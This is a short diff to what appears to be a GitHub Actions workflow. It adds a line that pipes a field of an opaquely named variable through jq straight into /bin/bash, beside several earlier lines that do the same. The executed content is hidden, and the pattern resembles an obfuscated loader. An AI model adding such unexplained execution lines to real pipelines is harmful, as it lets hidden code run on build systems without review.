@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$rf9" | jq -r .oqtq9554 | /bin/bash
           echo $wdtax768 | jq -r .wshj4 | /bin/bash
           echo $y966 | jq -r .jhn17091 | /bin/bash
+          echo $k5990 | jq -r .f5 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
